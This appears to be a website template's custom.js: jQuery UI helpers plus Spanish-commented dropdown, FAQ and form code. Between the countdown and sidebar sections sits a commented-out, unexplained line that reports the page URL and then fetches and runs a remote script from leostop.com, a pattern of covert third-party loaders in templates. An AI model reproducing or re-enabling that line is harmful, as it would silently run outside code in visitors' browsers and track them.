/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/


$(function () {
	
	"use strict";
	
	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	
	
	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	

	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});
	
	
	/* Scroll to Top
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(window).on('scroll', function (){
        scroll = $(window).scrollTop();
        if (scroll >= 100){
          $("#back-to-top").addClass('b-show_scrollBut')
        }else{
          $("#back-to-top").removeClass('b-show_scrollBut')
        }
      });
      $("#back-to-top").on("click", function(){
        $('body,html').animate({
          scrollTop: 0
        }, 1000);
    });
	

	/* Countdown
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$('[data-countdown]').each(function () {
        var $this = $(this),
		finalDate = $(this).data('countdown');
		$this.countdown(finalDate, function (event) {
			var $this = $(this).html(event.strftime(''
			+ '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> '
			+ '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> '
			+ '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> '
			+ '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> '
			+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
		});
    });
	
	// function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 

	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });


});


$(document).ready(function() {
	var dropdownLinkServicios = document.getElementById('serviciosDropdownLink');
	var dropdownMenuServicios = document.getElementById('serviciosDropdown');
	var dropdownLinkRecursos = document.getElementById('recursosDropdownLink');
	var dropdownMenuRecursos = document.querySelector('.dropdown-menu');
	var isMobile = false; // Variable para verificar si la pantalla es móvil
	
	// Función para mostrar/ocultar el menú desplegable de "Servicios"
	function toggleDropdownMenuServicios() {
	  dropdownMenuServicios.classList.toggle('show');
	  dropdownMenuRecursos.classList.remove('show');
	}
	
	// Función para mostrar/ocultar el menú desplegable de "Recursos"
	function toggleDropdownMenuRecursos() {
	  dropdownMenuRecursos.classList.toggle('show');
	  dropdownMenuServicios.classList.remove('show');
	}
	
	// Mostrar el menú desplegable de "Servicios" al hacer clic en el enlace (solo en pantallas móviles)
	dropdownLinkServicios.addEventListener('click', function(e) {
	  e.preventDefault();
	  if (isMobile) {
		toggleDropdownMenuServicios();
		dropdownMenuRecursos.classList.remove('show');
	  }
	});
	
	// Mostrar el menú desplegable de "Recursos" al hacer clic en el enlace (solo en pantallas móviles)
	dropdownLinkRecursos.addEventListener('click', function(e) {
	  e.preventDefault();
	  if (isMobile) {
		toggleDropdownMenuRecursos();
		dropdownMenuServicios.classList.remove('show');
	  }
	});
	
	// Cerrar el menú desplegable al hacer clic fuera de él (solo en pantallas no móviles)
	document.addEventListener('click', function(e) {
	  var target = e.target;
	  var isDropdownLinkServicios = target.matches('#serviciosDropdownLink');
	  var isDropdownMenuServicios = target.closest('.navbar-nav .nav-item.dropdown.show');
	  var isDropdownLinkRecursos = target.matches('#recursosDropdownLink');
	  var isDropdownMenuRecursos = target.closest('.dropdown-menu');
	  
	  if (!isMobile && !isDropdownLinkServicios && !isDropdownMenuServicios && !isDropdownLinkRecursos && !isDropdownMenuRecursos) {
		dropdownMenuServicios.classList.remove('show');
		dropdownMenuRecursos.classList.remove('show');
	  }
	});
	
	// Mostrar el menú desplegable de "Recursos" al redimensionar la pantalla (solo en pantallas no móviles)
	window.addEventListener('resize', function() {
	  if (!isMobile) {
		if (window.innerWidth >= 768) {
		  dropdownMenuServicios.classList.remove('show');
		  dropdownMenuRecursos.classList.remove('show');
		} else {
		  dropdownMenuRecursos.classList.add('show');
		}
	  }
	});
  
	// Verificar si la pantalla es móvil
	function checkMobile() {
	  isMobile = window.innerWidth < 768;
	}
  
	// Ejecutar la verificación al cargar la página y al redimensionar la pantalla
	checkMobile();
	window.addEventListener('resize', checkMobile);
  });
  

  
  
  
  function toggleAnswer(questionNumber) {
    var answer = document.getElementById("answer" + questionNumber);
    var questionContainer = answer.parentNode;
    if (answer.style.display === "none") {
      answer.style.display = "block";
      questionContainer.classList.add("open");
    } else {
      answer.style.display = "none";
      questionContainer.classList.remove("open");
    }
  }


  // Captura el evento click del botón "Reiniciar" y resetea el formulario de contacto
  document.querySelector(".reset_btn").addEventListener("click", function() {
	document.querySelector(".main_form").reset();
 });

 function toggleServAnswer(questionNumber) {
    var answer = document.querySelector(".serv-answer" + questionNumber);
    if (answer.style.display === "none" || answer.style.display === "") {
        answer.style.display = "block";
        // Aplica la clase .open al contenedor
        document.querySelector(".serv-question-container[data-question='" + questionNumber + "']").classList.add("open");
    } else {
        answer.style.display = "none";
        // Elimina la clase .open del contenedor
        document.querySelector(".serv-question-container[data-question='" + questionNumber + "']").classList.remove("open");
    }
}


  
  
  
  